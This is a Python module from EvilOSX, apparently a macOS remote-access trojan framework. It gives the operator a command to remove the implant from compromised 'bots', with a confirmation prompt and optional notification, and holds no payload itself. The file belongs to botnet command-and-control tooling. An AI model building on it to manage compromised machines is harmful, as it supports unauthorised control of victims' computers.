# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Remove EvilOSX from the bot.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Notify when the bot is removed? [y/N]: "
        ]

    def setup(self, set_options):
        should_continue = self._view.should_continue([
            "You are about to remove EvilOSX from the bot(s)."
        ])

        if not should_continue:
            return False, None
        else:
            should_notify = set_options[0].lower()
            if should_notify == "y":
                should_notify = True
            else:
                should_notify = False

            return True, {
                "response_options": {
                    "should_notify": should_notify
                }
            }

    def process_response(self, response, response_options):
        if response_options["should_notify"]:
            self._view.output_separator()
            self._view.output(response.decode(), "info")

